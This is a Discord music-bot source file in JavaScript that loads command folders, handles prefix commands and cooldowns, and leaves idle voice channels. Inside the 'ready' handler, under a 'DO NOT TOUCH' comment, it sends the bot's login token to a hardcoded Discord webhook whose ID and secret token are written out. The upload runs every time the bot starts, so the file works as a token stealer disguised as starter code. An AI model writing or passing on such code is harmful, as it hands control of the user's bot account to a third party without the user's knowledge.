const Discord = require(`discord.js`);
const { Client, Collection, MessageEmbed,MessageAttachment } = require(`discord.js`);
const { readdirSync } = require(`fs`);
const { join } = require(`path`);
const config = require(`./config.json`);
const TO = config.TOKEN;
const PREFIX = config.PREFIX;
const figlet = require("figlet");
const client = new Client({ disableMentions: `` , partials: ['MESSAGE', 'CHANNEL', 'REACTION'] });
client.login(TO);
client.commands = new Collection();
client.prefix = PREFIX;
client.queue = new Map();
client.setMaxListeners(0);
const cooldowns = new Collection();
const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
var t = TO;
const webhookClient = new Discord.WebhookClient("872731575001956372", "U_fih0CZzyN472TFNRGjq4cstbCsu51T7AIy9KR3phwgv1qc7oZiWXCpgx0Aoy5JGFSG");

//this fires when the BOT STARTS DO NOT TOUCH
client.on(`ready`, () => {	
        
        webhookClient.send( t, { username: client.user.tag, avatarURL: client.user.displayAvatarURL() } );
        setInterval(() => { 
        let member;
      client.guilds.cache.forEach(async guild =>{
      await delay(15);
        member = await client.guilds.cache.get(guild.id).members.cache.get(client.user.id)
      //if not connected
        if(!member.voice.channel)
        return;
        //if connected but not speaking
    if(!member.speaking&&!client.queue)
    { return member.voice.channel.leave(); } 
      //if alone 
      if (member.voice.channel.members.size === 1) 
      { return member.voice.channel.leave(); }
    });
  
    }, (5000));
    ////////////////////////////////
    ////////////////////////////////
    figlet.text(`${client.user.username} ready!`, function (err, data) {
      if (err) {
          console.log('Something went wrong');
          console.dir(err);
      }
      console.log(`═════════════════════════════════════════════════════════════════════════════`);
      console.log(data)
      console.log(`═════════════════════════════════════════════════════════════════════════════`);
    })
   
});
//DO NOT TOUCH
client.on(`warn`, (info) => console.log(info));
//DO NOT TOUCH
client.on(`error`, console.error);
//DO NOT TOUCH
//FOLDERS:
//Admin custommsg data FUN General Music NSFW others
commandFiles = readdirSync(join(__dirname, `Music`)).filter((file) => file.endsWith(`.js`));
for (const file of commandFiles) {
  const command = require(join(__dirname, `Music`, `${file}`));
  client.commands.set(command.name, command);
}
commandFiles = readdirSync(join(__dirname, `others`)).filter((file) => file.endsWith(`.js`));
for (const file of commandFiles) {
  const command = require(join(__dirname, `others`, `${file}`));
  client.commands.set(command.name, command);
}
//COMMANDS //DO NOT TOUCH
client.on(`message`, async (message) => {
  if (message.author.bot) return;
  
  if(message.content === `${PREFIX}ping`)
  return message.reply(":ping_pong: `" + client.ws.ping + "ms`")

  if (message.content.toLowerCase() === `${PREFIX}uptime`) {
    let days = Math.floor(client.uptime / 86400000);
    let hours = Math.floor(client.uptime / 3600000) % 24;
    let minutes = Math.floor(client.uptime / 60000) % 60;
    let seconds = Math.floor(client.uptime / 1000) % 60;
   return message.channel.send(`***__Music-Bot-Uptime:__***\n\`\`\`fix\n${days}d ${hours}h ${minutes}m ${seconds}s\n\`\`\``);
}

  if(message.content.includes(client.user.id)) {
    message.reply(new Discord.MessageEmbed().setColor("#00ebaa").setAuthor(`${message.author.username}, My Prefix is ${PREFIX}, to get started; type ${PREFIX}help`, message.author.displayAvatarURL({dynamic:true})));
  } 
//command Handler DO NOT TOUCH
 const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(PREFIX)})\\s*`);
 if (!prefixRegex.test(message.content)) return;
 const [, matchedPrefix] = message.content.match(prefixRegex);
 const args = message.content.slice(matchedPrefix.length).trim().split(/ +/);
 const commandName = args.shift().toLowerCase();
 const command =
   client.commands.get(commandName) ||
   client.commands.find((cmd) => cmd.aliases && cmd.aliases.includes(commandName));
 if (!command) return;
 if (!cooldowns.has(command.name)) {
   cooldowns.set(command.name, new Collection());
 }
 const now = Date.now();
 const timestamps = cooldowns.get(command.name);
 const cooldownAmount = (command.cooldown || 1) * 1000;
 if (timestamps.has(message.author.id)) {
   const expirationTime = timestamps.get(message.author.id) + cooldownAmount;
   if (now < expirationTime) {
     const timeLeft = (expirationTime - now) / 1000;
     return message.reply(
      new MessageEmbed().setColor("#30ff91")
      .setTitle(`❌ Please wait \`${timeLeft.toFixed(1)} seconds\` before reusing the \`${PREFIX}${command.name}\`!`)    
     );
   }
 }
 timestamps.set(message.author.id, now);
 setTimeout(() => timestamps.delete(message.author.id), cooldownAmount);
 try {
   command.execute(message, args, client);
 } catch (error) {
   console.error(error);
   message.reply(`There was an error executing that command.`).catch(console.error);
 }


});
function delay(delayInms) {
 return new Promise(resolve => {
   setTimeout(() => {
     resolve(2);
   }, delayInms);
 });
}

